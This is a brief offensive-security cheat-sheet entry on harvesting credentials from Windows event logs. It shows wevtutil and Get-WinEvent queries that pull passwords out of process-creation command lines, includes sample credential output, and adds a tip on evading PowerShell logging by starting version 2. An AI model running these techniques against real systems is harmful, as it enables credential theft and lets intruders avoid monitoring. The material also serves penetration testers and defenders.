## Reading the Event Log for credential harvesting

Members of the [Event Log Readers](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)?redirectedfrom=MSDN#event-log-readers) group can read the Event Log.
We can do it using [wevtutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) command or with the [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1) PowerShell cmdlet.
### Search for events using wevtutil
Querying events in the "Security" log, in reverse chronological order, in text format, grep for "/user" : 
```ps
wevtutil qe Security /rd:true /f:text | findstr "/user"
```
You can also pass credentials to wevtutil, like in the next example searching in remote "share01", as user julie.clay
```ps
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1
```
### Using Get-WinEvent
/!\ This method requires either __administrator__ permissions or adjusted permissions on the __HKLM\System\CurrentControlSet\Services\Eventlog\Security__ registry key. Membership of the Event Log Readers groups is not enough.

It can also be provided credentials using the -Credential parameter.


The Event ID 4688 is [A new process has been created](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688) it registers every command entered in the command line. 
```ps1
Get-WinEvent -LogName Security |
Where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } |
Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value } }

CommandLine
-----------
net  use Z: \\DB01\scripts /user:mary W1ntergreen_gum_2021!
```

If enabled, another interesting log to look through would be [PowerShell Operational](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.1) Logs. It is often accessible to unprivileged users and may contain juicy information like credentials or scripts.


> 💡Note that if you start `PowerShell -Version 2`, the launch of powershell is logged, but not your activity on it